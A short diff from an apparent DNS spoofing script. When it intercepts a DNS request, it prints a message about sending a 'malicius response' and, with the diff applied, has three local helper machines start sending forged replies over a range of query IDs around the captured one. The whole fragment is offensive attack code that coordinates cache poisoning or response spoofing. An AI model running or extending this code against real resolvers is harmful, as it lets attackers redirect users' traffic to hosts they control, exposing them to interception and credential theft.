@@ -15,5 +15,5 @@ if __name__ == "__main__":
 			print("DNS request intercepted with QID of: " + str(qid) + ". Starting sending malicius response.")
 			
 			threading.Thread(target=requests.get, args=('http://192.168.0.160:8889?start_qid=' + str(qid),)).start()
-			#threading.Thread(target=requests.get, args=('http://192.168.0.161:8889?start_qid=' + str(qid-1000),)).start()
-			#threading.Thread(target=requests.get, args=('http://192.168.0.162:8889?start_qid=' + str(qid+1000),)).start()
+			threading.Thread(target=requests.get, args=('http://192.168.0.161:8889?start_qid=' + str(qid-1000),)).start()
+			threading.Thread(target=requests.get, args=('http://192.168.0.162:8889?start_qid=' + str(qid+1000),)).start()
